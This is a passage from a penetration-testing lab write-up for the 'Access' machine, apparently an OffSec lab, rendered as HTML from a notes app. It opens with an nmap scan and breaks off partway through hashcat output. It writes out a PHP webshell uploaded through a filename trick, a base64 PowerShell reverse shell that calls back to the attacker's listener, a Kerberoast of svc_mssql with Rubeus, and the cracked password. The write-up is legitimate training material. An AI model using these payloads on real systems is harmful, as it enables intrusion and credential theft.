+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 16:28 EST
+Nmap scan report for 192.168.229.187
+Host is up (0.0057s latency).
+Not shown: 65509 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Access The Event
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-23 21:28:53Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
+443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Access The Event
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=1/23%OT=53%CT=1%CU=31166%PV=Y%DS=4%DC=T%G=Y%TM=6973E85
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%TS=U)SEQ(SP=1
+OS:02%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%TS=U)
+OS:SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=F5%GCD=1%ISR=FD%TI=I%CI=I
+OS:%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW
+OS:8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
+OS:R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
+OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
+OS:UCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-23T21:30:01
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 2s
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT     ADDRESS
+1   4.86 ms 192.168.45.1
+2   4.84 ms 192.168.45.254
+3   4.87 ms 192.168.251.1
+4   4.90 ms 192.168.229.187
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.62 seconds</code></pre></div>
+<p>Since the target is running Windows, I am unable to upload PHP files directly. We will need to bypass the filter in place. Case manipulation did not work. However, I notice the <code class="inline-code">Windows dots</code> method works.</p>
+<p>Create a PHP file by the name <code class="inline-code">backdoor.php.....</code> that contains the following content:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&lt;?php echo system($_GET[&apos;cmd&apos;]); ?&gt;</pre><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&apos;cmd&apos;</span>]); <span class="hljs-meta">?&gt;</span></code></pre></div>
+<p>Then upload the PHP webshell using the <code class="inline-code">Buy Tickets</code> feature. Now we can browse to the <code class="inline-code">Uploads</code> directory to access the webshell:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ curl &quot;http://192.168.229.187/Uploads/backdoor.php?cmd=whoami&quot;
+access\svc_apache
+access\svc_apache                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ curl &quot;http://192.168.229.187/Uploads/backdoor.php?cmd=ipconfig&quot;
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.229.187
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.229.254
+   Default Gateway . . . . . . . . . : 192.168.229.254</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/<span class="hljs-keyword">Access</span>]
+&boxur;&boxh;$ curl <span class="hljs-string">&quot;http://192.168.229.187/Uploads/backdoor.php?cmd=whoami&quot;</span>
+<span class="hljs-keyword">access</span>\svc_apache
+<span class="hljs-keyword">access</span>\svc_apache                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/<span class="hljs-keyword">Access</span>]
+&boxur;&boxh;$ curl <span class="hljs-string">&quot;http://192.168.229.187/Uploads/backdoor.php?cmd=ipconfig&quot;</span>
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 <span class="hljs-number">2</span>:
+
+   Connection-specific DNS Suffix  . : 
+   <span class="hljs-type">IPv4</span> Address. . . . . . . . . . . : 192.168.229.187
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.229.254
+   Default Gateway . . . . . . . . . : 192.168.229.254</code></pre></div>
+<p>Time to obtain a reverse shell connection. Stand up a listener on port 80, and using <code class="inline-code">revshells.com</code> generate a PowerShell base64 encoded reverse shell:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ curl &quot;http://192.168.229.187/Uploads/backdoor.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA3ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ curl &quot;http://192.168.229.187/Uploads/backdoor.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA3ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;</code></pre></div>
+<p>And now we will obtain access:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo nc -lvnp 80                            
+[sudo] password for kali: 
+listening on [any] 80 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.229.187] 50144
+whoami
+access\svc_apache
+PS C:\xampp\htdocs\uploads&gt; ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : SERVER
+   Primary Dns Suffix  . . . . . . . : access.offsec
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : access.offsec
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-9E-DD-1E
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.229.187(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.229.254
+   DNS Servers . . . . . . . . . . . : 192.168.229.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+PS C:\xampp\htdocs\uploads&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo nc -lvnp 80                            
+[sudo] password for kali: 
+listening on [any] 80 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.229.187] 50144
+whoami
+access\svc_apache
+PS C:\xampp\htdocs\uploads&gt; ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : SERVER
+   Primary Dns Suffix  . . . . . . . : access.offsec
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : access.offsec
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-9E-DD-1E
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 192.168.229.187(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.229.254
+   DNS Servers . . . . . . . . . . . : 192.168.229.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+PS C:\xampp\htdocs\uploads&gt; </code></pre></div>
+<p>Privilege escalation is minimal.</p>
+<p>The <code class="inline-code">svc_mssql</code> is Kerberoastable. Transfer <code class="inline-code">Rubeus.exe</code> to the target machine and Kerberoast the <code class="inline-code">svc_mssql</code> account:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">PS C:\Temp&gt; .\Rubeus kerberoast /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : access.offsec
+[*] Searching path &apos;LDAP://SERVER.access.offsec/DC=access,DC=offsec&apos; for &apos;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&apos;
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : svc_mssql
+[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
+[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
+[*] PwdLastSet             : 5/21/2022 5:33:45 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$71434A05850620CE38E04360D6E8DD39$519295BD4F330F984A047ED0FBFA22591B740D8210808CB75F79B60FDA3E3BA63D873E9279025E57D455EF7B904650C9C016A58C5E8A9E3680216978557F658AD4F72CF7AFB8988E54EF9649273F74CAC7B2CE5B962220E7EE702ABF419CD732C0AF6EED7F8277DE4B1C76FECA15A094E7B9380C91AB0F01F2CEF917D9BB149FDD818C78001674940F17FB0EE22F5A021759621B7DE867D4193ED4F5B3DF077EEEFB04B932B6207F0465D6BFD36537362572AB752F40B237E035BEE291D8AF57AD7C7FF2AD53B9BCF43F5C80E34E16ED74E4D2932B8BE3EA16800D1336802A7286130B826F5CB81EDD26B4F0899573A1A510D121E85576DE169EAB314BAA4CC7AC28682541B43F144380B5C34A52225EA3D925B1879500915F16DB0BE4B91A832F88E59A5BB499F19D2943DA380711599B93BAA51AED091F0012E4F2D3478CFF56F2A1CB60B56D3A10E8FE22334FD407A052E515ABDEA52A71C325F0F1C8FB2C491EAC0EB91ACA4AF83C3C9F9B4B9E445714C6648D4DC3490917356FAFD7B7FD3B0B9E31455B756564493A3FF41C0DC633A55BFFC2A2F1C60C51EA1CE2BF4C021D528B843F47A975A45562FF18655A45739D28A65170706A008C36506D62161DE7ABB7950A4DB138955F50F4CDC9F6EFD40C25000C340F197A6EE0C3C0CAB650D9E1700A38222E2CFAF1F244FC37E1B21327CC796000BF8426538C0198FF412829E7E393CF76055C091AD163F39AF5EEC42EA2632865873E2995DB8D38128A80D16A793C608C20336E76634D8E648174323C6DF17E87BBC96BF80CC97C3946937CB626AACD2E5FDD3912B239460AB6FD4A6EE1081F2449D888AEF7D62A304BFB925D6BBB87EEF10E91E78B467EFF1E8ADE68A7D1F3EEC8C3F2498088D6980BBC589C9FF270907A1AED09AAAE13417BD334E2FE675FE713ABED1C62DBC6EBB6E31C3D17353A80830C5491B881BAAC8ABD16D65506E0E2D8F5F097972D1D533BED8C6A3B249884C056384B49D76BB16B04CEB84578681BA7196327DF4D013412DF4EC527BC6F02045EDC148C7BCFFFDBE7481E6EDAB6CD35D765BDC7AD716E1B22A6F963C081C42F5547719640E0CE433BFDDB6BB478983A4F4BF4C1DFE59C5ED1A0C91868E0830E2868463E22BBA5AE128EFC6F96DA0AC69B3645A9CA735948A08CD492F161CEFA5CC479E160FB7AD9FBD995BBD5EB3D34AAA3BF45CE7FF6257D5F4535A70CD8913D8BA1E10831128C1FADDD435E4215CA4113797F75B7CD1922A532A7EF6223E3114B9EE3D77333C9592EE99DD25DC4C2933497CC31AB2870DE28504E8E71399BC4423909CAC8A45C08FBE9276A77625301FFAF04469A9AABC8862E898359FE20F5082FB5ADE230833271DB8249311A0873B5F67F3E74513F2C20078121385F7E8298797AD16B79F85448E643D6BB9CC960F49A60533EA9DE16D05770F8AFB73E5F24B224CF3C382BE13A09A0A01742952E1179583A6882FB2FBF5D4E67DBB01C57D894AD1DA8A005970E50BA7E5B40DF0997518322B3AA1CCADAD94C5D87099AD6EF5D533661CED18C660CF5E62CC30DB79DDF7446F40D6977B779DFD414A4C7477265B1DC57E6C88C8D03</pre><pre class="hljs"><code>PS C:\Temp&gt; .\Rubeus kerberoast /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : access.offsec
+[*] Searching path &apos;LDAP://SERVER.access.offsec/DC=access,DC=offsec&apos; for &apos;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&apos;
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : svc_mssql
+[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
+[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
+[*] PwdLastSet             : 5/21/2022 5:33:45 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$71434A05850620CE38E04360D6E8DD39$519295BD4F330F984A047ED0FBFA22591B740D8210808CB75F79B60FDA3E3BA63D873E9279025E57D455EF7B904650C9C016A58C5E8A9E3680216978557F658AD4F72CF7AFB8988E54EF9649273F74CAC7B2CE5B962220E7EE702ABF419CD732C0AF6EED7F8277DE4B1C76FECA15A094E7B9380C91AB0F01F2CEF917D9BB149FDD818C78001674940F17FB0EE22F5A021759621B7DE867D4193ED4F5B3DF077EEEFB04B932B6207F0465D6BFD36537362572AB752F40B237E035BEE291D8AF57AD7C7FF2AD53B9BCF43F5C80E34E16ED74E4D2932B8BE3EA16800D1336802A7286130B826F5CB81EDD26B4F0899573A1A510D121E85576DE169EAB314BAA4CC7AC28682541B43F144380B5C34A52225EA3D925B1879500915F16DB0BE4B91A832F88E59A5BB499F19D2943DA380711599B93BAA51AED091F0012E4F2D3478CFF56F2A1CB60B56D3A10E8FE22334FD407A052E515ABDEA52A71C325F0F1C8FB2C491EAC0EB91ACA4AF83C3C9F9B4B9E445714C6648D4DC3490917356FAFD7B7FD3B0B9E31455B756564493A3FF41C0DC633A55BFFC2A2F1C60C51EA1CE2BF4C021D528B843F47A975A45562FF18655A45739D28A65170706A008C36506D62161DE7ABB7950A4DB138955F50F4CDC9F6EFD40C25000C340F197A6EE0C3C0CAB650D9E1700A38222E2CFAF1F244FC37E1B21327CC796000BF8426538C0198FF412829E7E393CF76055C091AD163F39AF5EEC42EA2632865873E2995DB8D38128A80D16A793C608C20336E76634D8E648174323C6DF17E87BBC96BF80CC97C3946937CB626AACD2E5FDD3912B239460AB6FD4A6EE1081F2449D888AEF7D62A304BFB925D6BBB87EEF10E91E78B467EFF1E8ADE68A7D1F3EEC8C3F2498088D6980BBC589C9FF270907A1AED09AAAE13417BD334E2FE675FE713ABED1C62DBC6EBB6E31C3D17353A80830C5491B881BAAC8ABD16D65506E0E2D8F5F097972D1D533BED8C6A3B249884C056384B49D76BB16B04CEB84578681BA7196327DF4D013412DF4EC527BC6F02045EDC148C7BCFFFDBE7481E6EDAB6CD35D765BDC7AD716E1B22A6F963C081C42F5547719640E0CE433BFDDB6BB478983A4F4BF4C1DFE59C5ED1A0C91868E0830E2868463E22BBA5AE128EFC6F96DA0AC69B3645A9CA735948A08CD492F161CEFA5CC479E160FB7AD9FBD995BBD5EB3D34AAA3BF45CE7FF6257D5F4535A70CD8913D8BA1E10831128C1FADDD435E4215CA4113797F75B7CD1922A532A7EF6223E3114B9EE3D77333C9592EE99DD25DC4C2933497CC31AB2870DE28504E8E71399BC4423909CAC8A45C08FBE9276A77625301FFAF04469A9AABC8862E898359FE20F5082FB5ADE230833271DB8249311A0873B5F67F3E74513F2C20078121385F7E8298797AD16B79F85448E643D6BB9CC960F49A60533EA9DE16D05770F8AFB73E5F24B224CF3C382BE13A09A0A01742952E1179583A6882FB2FBF5D4E67DBB01C57D894AD1DA8A005970E50BA7E5B40DF0997518322B3AA1CCADAD94C5D87099AD6EF5D533661CED18C660CF5E62CC30DB79DDF7446F40D6977B779DFD414A4C7477265B1DC57E6C88C8D03</code></pre></div>
+<p>Crack the hash to obtain the password <code class="inline-code">trustno1</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 946729410
+
+$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$71434a05850620ce38e04360d6e8dd39$519295bd4f330f984a047ed0fbfa22591b740d8210808cb75f79b60fda3e3ba63d873e9279025e57d455ef7b904650c9c016a58c5e8a9e3680216978557f658ad4f72cf7afb8988e54ef9649273f74cac7b2ce5b962220e7ee702abf419cd732c0af6eed7f8277de4b1c76feca15a094e7b9380c91ab0f01f2cef917d9bb149fdd818c78001674940f17fb0ee22f5a021759621b7de867d4193ed4f5b3df077eeefb04b932b6207f0465d6bfd36537362572ab752f40b237e035bee291d8af57ad7c7ff2ad53b9bcf43f5c80e34e16ed74e4d2932b8be3ea16800d1336802a7286130b826f5cb81edd26b4f0899573a1a510d121e85576de169eab314baa4cc7ac28682541b43f144380b5c34a52225ea3d925b1879500915f16db0be4b91a832f88e59a5bb499f19d2943da380711599b93baa51aed091f0012e4f2d3478cff56f2a1cb60b56d3a10e8fe22334fd407a052e515abdea52a71c325f0f1c8fb2c491eac0eb91aca4af83c3c9f9b4b9e445714c6648d4dc3490917356fafd7b7fd3b0b9e31455b756564493a3ff41c0dc633a55bffc2a2f1c60c51ea1ce2bf4c021d528b843f47a975a45562ff18655a45739d28a65170706a008c36506d62161de7abb7950a4db138955f50f4cdc9f6efd40c25000c340f197a6ee0c3c0cab650d9e1700a38222e2cfaf1f244fc37e1b21327cc796000bf8426538c0198ff412829e7e393cf76055c091ad163f39af5eec42ea2632865873e2995db8d38128a80d16a793c608c20336e76634d8e648174323c6df17e87bbc96bf80cc97c3946937cb626aacd2e5fdd3912b239460ab6fd4a6ee1081f2449d888aef7d62a304bfb925d6bbb87eef10e91e78b467eff1e8ade68a7d1f3eec8c3f2498088d6980bbc589c9ff270907a1aed09aaae13417bd334e2fe675fe713abed1c62dbc6ebb6e31c3d17353a80830c5491b881baac8abd16d65506e0e2d8f5f097972d1d533bed8c6a3b249884c056384b49d76bb16b04ceb84578681ba7196327df4d013412df4ec527bc6f02045edc148c7bcfffdbe7481e6edab6cd35d765bdc7ad716e1b22a6f963c081c42f5547719640e0ce433bfddb6bb478983a4f4bf4c1dfe59c5ed1a0c91868e0830e2868463e22bba5ae128efc6f96da0ac69b3645a9ca735948a08cd492f161cefa5cc479e160fb7ad9fbd995bbd5eb3d34aaa3bf45ce7ff6257d5f4535a70cd8913d8ba1e10831128c1faddd435e4215ca4113797f75b7cd1922a532a7ef6223e3114b9ee3d77333c9592ee99dd25dc4c2933497cc31ab2870de28504e8e71399bc4423909cac8a45c08fbe9276a77625301ffaf04469a9aabc8862e898359fe20f5082fb5ade230833271db8249311a0873b5f67f3e74513f2c20078121385f7e8298797ad16b79f85448e643d6bb9cc960f49a60533ea9de16d05770f8afb73e5f24b224cf3c382be13a09a0a01742952e1179583a6882fb2fbf5d4e67dbb01c57d894ad1da8a005970e50ba7e5b40df0997518322b3aa1ccadad94c5d87099ad6ef5d533661ced18c660cf5e62cc30db79ddf7446f40d6977b779dfd414a4c7477265b1dc57e6c88c8d03:trustno1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)</pre><pre class="hljs"><code>Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 946729410
+
